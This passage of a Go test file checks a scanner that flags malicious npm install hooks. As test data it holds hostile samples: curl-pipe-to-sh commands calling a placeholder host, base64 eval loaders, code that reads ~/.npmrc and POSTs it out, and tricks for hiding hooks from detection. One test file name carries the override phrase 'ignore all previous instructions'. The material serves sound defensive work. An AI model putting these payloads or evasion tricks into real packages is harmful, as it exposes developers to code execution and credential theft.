	r := &InstallScriptRule{Limits: DefaultInstallScriptLimits()}
	if _, err := r.Run(ctx); err != nil {
		t.Fatal(err)
	}
	ctx.Cancelled = func() bool { return true }
	_, err := r.Run(ctx)
	if se, ok := err.(*SkippedError); !ok || se.Reason != Interrupted {
		t.Fatalf("%v", err)
	}
	if n := len(installTable(ctx.Store).Load()); n != 2 {
		t.Errorf("%d rows kept", n)
	}
}

// Ways to hide a hook from the checks (each sample inert text).

func TestInstallHookNewlinesAreCommands(t *testing.T) {
	p, _ := ParseInstallPackage([]byte(`{"scripts": {"postinstall": "# build step\ncurl -s https://x.example.invalid/a | sh"}}`))
	s := InstallHookSignals(p)
	if len(s) != 1 || !strings.Contains(s[0].Label, "从网上下载代码直接运行") || !reflect.DeepEqual(s[0].Lines, []int{1}) {
		t.Errorf("%+v", s)
	}
	root := t.TempDir()
	writeFiles(t, root, map[string]string{"evil.js": "1"})
	p, _ = ParseInstallPackage([]byte(`{"scripts": {"postinstall": "echo ok\nnode evil.js"}}`))
	if got := InstallPackageTargets(root, p); len(got) != 1 || got[0].Path != "evil.js" {
		t.Errorf("%+v", got)
	}
}

func TestParseInstallPackageExactly(t *testing.T) {
	p, ok := ParseInstallPackage([]byte(`{"scripts": {"postinstall": "node evil.js"}, "SCRIPTS": {"postinstall": "node-gyp rebuild"}, "Name": "x", "name": "real"}`))
	if !ok || p.Hooks["postinstall"] != "node evil.js" || p.Name != "real" {
		t.Errorf("%+v", p)
	}
	p, ok = ParseInstallPackage([]byte(`{"SCRIPTS": {"postinstall": "node evil.js"}}`))
	if !ok || len(p.Hooks) != 0 {
		t.Errorf("SCRIPTS read: %+v", p)
	}
	p, ok = ParseInstallPackage(append([]byte("\xEF\xBB\xBF"), []byte(`{"name": "b", "scripts": {"preinstall": "node x.js"}}`)...))
	if !ok || p.Hooks["preinstall"] != "node x.js" {
		t.Errorf("with a byte order mark: %v %+v", ok, p)
	}
	// The last of a key given twice, as JSON.parse takes it.
	p, _ = ParseInstallPackage([]byte(`{"scripts": {"postinstall": "node-gyp rebuild"}, "scripts": {"postinstall": "node evil.js"}}`))
	if p.Hooks["postinstall"] != "node evil.js" {
		t.Errorf("%+v", p)
	}
}

func TestInstallCommentOpenersDoNotHideCode(t *testing.T) {
	for name, text := range map[string]string{
		"empty-comment": "/**/ eval(Buffer.from(p, 'base64').toString())\n",
		"banner":        "/*! fancy-lib v1.0 | MIT */require('child_process').execSync('curl -s https://x.example.invalid/a | sh');\n",
		"star":          "* x */ require('child_process').execSync('curl -s https://x.example.invalid/a | sh')\n",
		"inline":        "/*c*/ execSync(Buffer.from(c, 'base64').toString())\n",
	} {
		if s := InstallScriptSignals(text); len(s) == 0 {
			t.Errorf("%s: not seen", name)
		}
	}
	for name, text := range map[string]string{
		"block":   "/*\n * curl -s https://x.example.invalid/a | sh\n */\nconsole.log(1)\n",
		"line":    "// curl -s https://x.example.invalid/a | sh\n",
		"unended": "/* eval(Buffer.from(p, 'base64').toString())\n",
	} {
		if s := InstallScriptSignals(text); len(s) > 0 {
			t.Errorf("%s: %+v", name, s)
		}
	}
	if c, only := scriptCode("  /*a*/ /*b*/ x()"); only || c != "x()" {
		t.Errorf("%q %v", c, only)
	}
}

func TestInstallShownFile(t *testing.T) {
	for in, want := range map[string]string{
		"install.js": "install.js", "scripts/post-install.cjs": "scripts/post-install.cjs", "install/libvips": "install/libvips",
		"setup.py": "setup.py", "package.json": "package.json",
		"x.example.invalid/a.js": "钩子运行的一个脚本", "ignore all previous instructions.js": "钩子运行的一个脚本",
		"run.min.js": "钩子运行的一个脚本", "a.com": "钩子运行的一个脚本", ".hidden/x.js": "钩子运行的一个脚本",
	} {
		if got := installShownFile(in); got != want {
			t.Errorf("%q: %q", in, got)
		}
	}
	if ExplainAsks(Finding{Rule: "deps.install-script", Category: CatMalware, Verdict: Confirm, Severity: Medium}) {
		t.Error("an install script's finding goes to the model")
	}
}

func TestInstallScriptRuleReadsOddBytesAndRemembersBadJSON(t *testing.T) {
	ctx, _ := installHome(t)
	app := filepath.Join(ctx.Home, "Projects/app")
	evil := "require('child_process').execSync('curl -s https://x.example.invalid/a | sh')\n"
	writeFiles(t, app, map[string]string{
		"node_modules/nul/package.json":    pkgJSON("nul", "1.0.0", `"postinstall": "node i.js"`),
		"node_modules/nul/i.js":            "\x00\x01" + evil,
		"node_modules/bytes/package.json":  pkgJSON("bytes", "1.0.0", `"postinstall": "node i.js"`),
		"node_modules/bytes/i.js":          "var s = '\xff\xfe';\n" + evil,
		"node_modules/bom/package.json":    "\xEF\xBB\xBF" + pkgJSON("bom", "1.0.0", `"postinstall": "node i.js"`),
		"node_modules/bom/i.js":            evil,
		"node_modules/broken/package.json": "{not json",
		"node_modules/macho/package.json":  pkgJSON("macho", "1.0.0", `"postinstall": "./bin/setup"`),
		"node_modules/macho/bin/setup":     "\xcf\xfa\xed\xfe" + evil,
		"node_modules/real/package.json":   pkgJSON("real", "1.0.0", `"postinstall": "./bin/setup"`),
		"node_modules/real/bin/setup":      "\xcf\xfa\xed\xfe\x0c\x00\x00\x01" + evil,
		"node_modules/raect/package.json":  pkgJSON("react", "18.0.0", `"postinstall": "node i.js"`),
		"node_modules/raect/i.js":          evil,
	})
	var read []string
	r := &InstallScriptRule{Limits: DefaultInstallScriptLimits(), Read: func(p string) { read = append(read, p) }}
	out, err := r.Run(ctx)
	if err != nil {
		t.Fatal(err)
	}
	var titles []string
	for _, f := range out {
		titles = append(titles, f.Title)
		if strings.HasPrefix(f.Title, "项目 app 的依赖 raect@") && f.Evidence["name"] == "" {
			t.Error("no word on the claimed name")
		}
	}
	sort.Strings(titles)
	// macho only starts like a program (sh runs it as a script: no NUL in its first line); real is one, run by itself.
	want := []string{"项目 app 的依赖 bom@1.0.0 安装时会从网上下载代码直接运行", "项目 app 的依赖 bytes@1.0.0 安装时会从网上下载代码直接运行",
		"项目 app 的依赖 macho@1.0.0 安装时会从网上下载代码直接运行",
		"项目 app 的依赖 nul@1.0.0 安装时会从网上下载代码直接运行", "项目 app 的依赖 raect@18.0.0 安装时会从网上下载代码直接运行"}
	if !reflect.DeepEqual(titles, want) {
		t.Errorf("%q", titles)
	}
	read = nil
	if _, err := r.Run(ctx); err != nil || len(read) != 0 {
		t.Errorf("read again: %v %v", read, err)
	}
	// A change that keeps the size and the modification time still shows in the change time.
	p := filepath.Join(app, "node_modules/nul/i.js")
	st, _ := os.Stat(p)
	os.WriteFile(p, []byte("\x00\x01"+strings.Replace(evil, "curl", "true", 1)), 0o644)
	os.Chtimes(p, st.ModTime(), st.ModTime())
	read = nil
	out, _ = r.Run(ctx)
	if len(read) != 1 || len(out) != 4 {
		t.Errorf("read %v, %d findings", read, len(out))
	}
	// The program run through sh is read as a script, although it was left unread as a program and has not changed.
	os.WriteFile(filepath.Join(app, "node_modules/real/package.json"), []byte(pkgJSON("real", "1.0.0", `"postinstall": "sh -e ./bin/setup"`)), 0o644)
	out, _ = r.Run(ctx)
	found := false
	for _, f := range out {
		found = found || f.Title == "项目 app 的依赖 real@1.0.0 安装时会从网上下载代码直接运行"
	}
	if !found {
		t.Errorf("a program's header hides a script run by sh: %+v", out)
	}
}

// Second review: ways around the checks (each sample inert text).

const installCurlSh = "curl…|sh"

func installHas(s []InstallSignal, label string) bool {
	for _, x := range s {
		if strings.Contains(x.Label, label) {
			return true
		}
	}
	return false
}

// No word excuses a command, wherever it stands: elsewhere on the line, in the same statement (a variable named flags,
// FLAGS=1 before a shell command), or inside the string that is run through a variable. Only a pattern (a regex literal,
// a string handed to a regex constructor) talks about such things.
func TestInstallWordsElsewhereDoNotExcuse(t *testing.T) {
	run := "require('child_process').execSync('" + installCurlSh + "')"
	for name, text := range map[string]string{
		"comment.js":  "execSync('" + installCurlSh + "') // flags\n",
		"block.js":    run + " /* detect */\n",
		"regex.js":    "x=s.replace(/\\s+/g,'');" + run + "\n",
		"words.js":    "const t='malicious';" + run + "\n",
		"comma.js":    "var pattern=1,y=" + run + "\n",
		"negation.js": "console.log(\"never mind\");" + run + "\n",
		"minified.js": strings.Repeat("var a=/\\s+/,flags=1;function f(){return a}", 60) + run + ";" + strings.Repeat("var c=3;", 60) + "\n",
		"comment.sh":  installCurlSh + " # flags\n",
		"after.sh":    "echo dangerous; " + installCurlSh + "\n",
		"no-name":     "execSync('" + installCurlSh + "') // flags\n",
		// A name or a word anywhere does not excuse what runs: in the same statement, in another one, inside the string
		// that is run through a variable.
		"flags-env.sh":  "FLAGS=1 " + installCurlSh + "\n",
		"flags-var.js":  "const flags=execSync('" + installCurlSh + "')\n",
		"pattern-cp.js": "const pattern = require('child_process').execSync('" + installCurlSh + "')\n",
		"subst.sh":      "PATTERN=$(" + installCurlSh + ")\n",
		"flags-py.py":   "flags = os.system('" + installCurlSh + "')\n",
		"no-name-flags": "FLAGS=1 " + installCurlSh + "\n",
		"split.js":      "const flags = '" + installCurlSh + "';\nrequire('child_process').execSync(flags)\n",
		"inside.js":     "const s = '" + installCurlSh + " # never, flags, pattern \\\\s';\nrequire('child_process').execSync(s)\n",
		"inside.py":     "s = \"" + installCurlSh + " # malicious\"\nimport os\nos.system(s)\n",
		// A string that only reads like a list or a warning is reported too: from the text alone it cannot be told from
		// one that is run a statement later.
		"list.js":  "const PATTERNS = ['" + installCurlSh + "'];\n",
		"name.js":  "const suspicious = '" + installCurlSh + "';\n",
		"echo.sh":  "echo \"never pipe it: curl https://x.example.invalid/a | sh\"\n",
		"about.js": "const note = 'do not exec: curl https://x.example.invalid/a | sh';\n",
	} {
		var s []InstallSignal
		if strings.HasPrefix(name, "no-name") {
			s = InstallScriptSignals(text)
		} else {
			s, _ = InstallFileSignals(name, text, nil)
		}
		if !installHas(s, "从网上下载代码直接运行") {
			t.Errorf("%s: not seen: %+v", name, s)
		}
	}
	// A pattern for such things, and a comment, are still not reported.
	for name, text := range map[string]string{
		"regex.js":   "const R = /curl https:\\/\\/x\\.example\\.invalid\\/a \\| sh/;\n",
		"ctor.js":    "const R = new RegExp('curl https://x.example.invalid/a | sh');\n",
		"ctor.py":    "import re\nR = re.compile(r'curl https://x.example.invalid/a | sh')\n",
		"comment.js": "// curl https://x.example.invalid/a | sh\n",
		"doc.js":     "/**\n * Never: curl https://x.example.invalid/a | sh\n */\nmodule.exports = 1;\n",
		"comment.sh": "# curl https://x.example.invalid/a | sh\necho ok\n",
		"setup.py":   "# curl https://x.example.invalid/a | sh\nimport os\n",
	} {
		if s, _ := InstallFileSignals(name, text, nil); len(s) > 0 {
			t.Errorf("%s: %+v", name, s)
		}
	}
}

// What is code in the file's language is not read as a comment: REM and # start code in JavaScript, a line starting
// with * outside a block comment continues an expression, and * or -- in sh is a command.
func TestInstallCommentsByLanguage(t *testing.T) {
	run := "require('child_process').execSync('" + installCurlSh + "')"
	for name, text := range map[string]string{
		"rem.js":      "REM = " + run + "\n",
		"star.js":     "x = 2\n* " + run + "\n",
		"field.js":    "class A {\n#x = " + run + "\n}\n",
		"star.sh":     "* ; " + installCurlSh + "\n",
		"dashes.sh":   "-- ; " + installCurlSh + "\n",
		"rem.sh":      "REM = 1; " + installCurlSh + "\n",
		"after.js":    "/* a */\n* " + run + "\n",
		"no-name-rem": "REM = " + run + "\n",
		"no-name-*":   "* ; " + installCurlSh + "\n",
	} {
		var s []InstallSignal
		if strings.HasPrefix(name, "no-name") {
			s = InstallScriptSignals(text)
		} else {
			s, _ = InstallFileSignals(name, text, nil)
		}
		if !installHas(s, "从网上下载代码直接运行") {
			t.Errorf("%s: not seen: %+v", name, s)
		}
	}
	// Comments still are: a block comment's lines, # in sh and python, // in JavaScript.
	for name, text := range map[string]string{
		"block.js":  "/*\n * " + installCurlSh + "\n  " + installCurlSh + " */\nmodule.exports = 1;\n",
		"line.js":   "  // " + installCurlSh + "\n",
		"hash.sh":   "#!/bin/sh\n# " + installCurlSh + "\n",
		"hash.py":   "# " + installCurlSh + "\n",
		"shebang":   "#!/usr/bin/env node\n// " + installCurlSh + "\n",
		"shebang-2": "#!/bin/sh\n# " + installCurlSh + "\n",
	} {
		if s, _ := InstallFileSignals(name, text, nil); len(s) > 0 {
			t.Errorf("%s: %+v", name, s)
		}
	}
}

// A package.json nested deeper than Go's reader goes (npm reads it, and runs its hooks) is reported as not checked,
// every round, not taken for one that is not JSON.
func TestInstallScriptRuleTooDeepPackageJSON(t *testing.T) {
	ctx, _ := installHome(t)
	app := filepath.Join(ctx.Home, "Projects/app")
	deep := `{"name": "deep", "version": "1.0.0", "scripts": {"postinstall": "node i.js"}, "x": ` +
		strings.Repeat("[", 10001) + strings.Repeat("]", 10001) + `}`
	if _, ok := ParseInstallPackage([]byte(deep)); ok {
		t.Fatal("read by Go after all: the test does not test anything")
	}
	writeFiles(t, app, map[string]string{
		"node_modules/deep/package.json": deep,
		"node_modules/deep/i.js":         "require('child_process').execSync('" + installCurlSh + "')\n",
		"node_modules/bad/package.json":  "{not json",
	})
	var read []string
	r := &InstallScriptRule{Limits: DefaultInstallScriptLimits(), Read: func(p string) { read = append(read, p) }}
	for round := 0; round < 2; round++ {
		read = nil
		out, err := r.Run(ctx)
		if err != nil {
			t.Fatal(err)
		}
		if len(out) != 1 || out[0].Rule != "deps.install-script.partial" || !strings.Contains(out[0].Title, "1 个 package.json 嵌套太深") ||
			out[0].Evidence["files"] != "1" {
			t.Errorf("round %d: %+v", round, out)
		}
		if round == 1 && len(read) != 0 {
			t.Errorf("read again: %v", read)
		}
	}
}

// installSlowSamples: half a megabyte each of what made the checks' time grow with the square of the hits.
func installSlowSamples() map[string]string {
	const size = 512 << 10
	fill := func(unit, sep string) string {
		var b strings.Builder
		for b.Len() < size {
			b.WriteString(unit)
			b.WriteString(sep)
		}
		return b.String()
	}
	return map[string]string{
		"lines.js":    fill("require('child_process').execSync('curl -s https://x.example.invalid/a | sh')", "\n"),
		"minified.js": fill("require('child_process').execSync('curl -s https://x.example.invalid/a | sh')", ";"),
		// Downloads and files made executable, never the same file: every pair near enough is looked at.
		"pairs.sh": fill("curl -sL -o /tmp/aa https://x.example.invalid/t\nchmod +x /tmp/bb", "\n") +
			"curl -sL -o /tmp/cc https://x.example.invalid/t\nchmod +x /tmp/cc\n",
		"secrets.js": fill("fs.readFileSync(os.homedir()+'/.npmrc');https.request({hostname:'c.example.invalid',method:'POST'})", ";"),
		"assign.sh":  fill("RC=~/.zshrc\necho x >> \"$RC\"", "\n"),
		"setup.py":   fill("os.system('curl -s https://x.example.invalid/a | sh')", "\n"),
	}
}

func TestInstallLargeScriptIsQuick(t *testing.T) {
	for name, text := range installSlowSamples() {
		start := time.Now()
		s, ok := InstallFileSignals(name, text, nil)
		took := time.Since(start)
		if !ok || len(s) == 0 {
			t.Errorf("%s: nothing found", name)
		}
		// Was 54 s for one; a generous bound for a busy machine.
		if took > 20*time.Second {
			t.Errorf("%s: %v for %d KB", name, took, len(text)>>10)
		}
		t.Logf("%s: %v", name, took)
	}
}

func TestInstallLargeScriptHonoursCancellation(t *testing.T) {
	text := installSlowSamples()["minified.js"]
	start := time.Now()
	calls := 0
	_, ok := InstallFileSignals("minified.js", text, func() bool { calls++; return calls > 2 })
	if ok || time.Since(start) > 3*time.Second {
		t.Errorf("ok %v after %v", ok, time.Since(start))
	}
	// In a round: cancelled while the file is checked, the round stops and the file is not kept as read.
	ctx, _ := installHome(t)
	writeFiles(t, filepath.Join(ctx.Home, "Projects/app"), map[string]string{
		"node_modules/big/package.json": pkgJSON("big", "1.0.0", `"postinstall": "node i.js"`), "node_modules/big/i.js": text})
	stop := false
	ctx.Cancelled = func() bool { return stop }
	r := &InstallScriptRule{Limits: DefaultInstallScriptLimits(), Read: func(p string) {
		if strings.HasSuffix(p, "i.js") {
			stop = true
		}
	}}
	start = time.Now()
	_, err := r.Run(ctx)
	if se, ok := err.(*SkippedError); !ok || se.Reason != Interrupted || time.Since(start) > 3*time.Second {
		t.Errorf("%v after %v", err, time.Since(start))
	}
	for p := range installTable(ctx.Store).Load() {
		if strings.HasSuffix(p, "i.js") {
			t.Error("a file cut short kept as read")
		}
	}
}
